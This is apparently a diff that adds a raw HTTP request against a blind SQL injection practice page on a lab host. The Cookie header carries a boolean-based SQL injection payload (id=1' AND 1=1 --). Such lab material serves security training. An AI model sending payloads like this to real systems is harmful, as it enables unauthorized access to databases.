@@ -1,0 +1,3 @@
+GET /vulnerabilities/sqli_blind/ HTTP/1.1
+Host: 10.31.0.87:3000
+Cookie: PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed; security=high; id=1%27 AND 1=1 -- x
